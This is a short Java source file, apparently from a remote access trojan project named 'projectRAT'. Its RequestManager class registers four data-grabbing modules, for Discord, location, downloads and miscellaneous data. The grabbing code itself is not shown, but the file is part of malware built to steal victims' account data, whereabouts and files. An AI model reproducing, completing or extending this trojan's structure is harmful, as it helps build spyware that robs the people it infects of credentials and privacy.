package in.momin5.projectRAT.request;

import in.momin5.projectRAT.request.grabbers.Discord;
import in.momin5.projectRAT.request.grabbers.Downloads;
import in.momin5.projectRAT.request.grabbers.Location;
import in.momin5.projectRAT.request.grabbers.MiscGrabs;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class RequestManager {

    private List<Request> requests = new ArrayList<>();

    public RequestManager() {
        requests.addAll(Arrays.asList(
                new MiscGrabs(),
                new Location(),
                new Discord(),
                new Downloads()
        ));
    }

    public List<Request> getRequests() {
        return requests;
    }
}
